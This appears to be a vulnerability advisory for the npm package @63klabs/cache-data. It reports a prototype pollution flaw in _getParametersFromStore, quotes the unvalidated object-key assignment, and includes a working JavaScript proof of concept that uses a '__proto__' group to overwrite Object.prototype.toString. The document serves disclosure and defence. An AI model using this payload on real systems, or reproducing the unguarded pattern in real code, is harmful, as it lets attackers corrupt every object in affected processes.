### Summary

A prototype pollution vulnerability in `@63klabs/cache-data` allows an attacker who controls the `parameters` passed to `_ConfigSuperClass._getParametersFromStore` to modify `Object.prototype`, corrupting properties inherited by every object in the running process.

### Details

The vulnerable code is in `lib/tools/index.js` (the `results.forEach` block near line 228). After resolving parameters from the SSM Parameter Store, the function groups each result using the caller-supplied `group` field as an object key, without validating it against dangerous keys such as `__proto__`, `constructor`, or `prototype`:

```js
const obj = parameters.find(o => o.path === groupPath);
const group = obj.group;
if ( !(group in paramstore)) {
    paramstore[group] = {};
}

// store key and value
paramstore[group][name] = param.Value;
```

Because `group` is attacker-controllable and unsanitized, setting it to `__proto__` makes `paramstore[group]` resolve to `Object.prototype`. The final line then becomes `Object.prototype[name] = param.Value`, where both `name` (derived from the requested parameter) and the value are attacker-influenced. Note the `!(group in paramstore)` guard does not help: `"__proto__" in {}` is already `true`, so the guard is skipped and the assignment writes straight onto the prototype.

### PoC

The following pollutes `Object.prototype.toString`. The SSM client is stubbed so the PoC runs without live AWS credentials, isolating the vulnerable grouping logic.

```js
const { tools } = require("@63klabs/cache-data");
const { AWS } = tools;

// Stub the SSM client so the PoC runs without live AWS access.
// It echoes back each requested name with a sentinel value.
Object.defineProperty(AWS, "ssm", {
  value: {
    getByName: async ({ Names }) => ({
      Parameters: Names.map((name) => ({ Name: name, Value: "polluted" })),
    }),
  },
});

const parameters = [
  {
    group: "__proto__",   // attacker-controlled key -> Object.prototype
    path: "/myapp/prod/",
    names: ["toString"],  // becomes the polluted property name
  },
];

tools._ConfigSuperClass
  ._getParametersFromStore(parameters)
  .then(() => {
    console.log("/-----[ Prototype Test ]-----/");
    console.log({}.toString); // -> "polluted" instead of the native function
  });
```

A clean baseline `{}.toString` is the native function; after the call it resolves to the injected value, confirming `Object.prototype` was modified.

Thanks!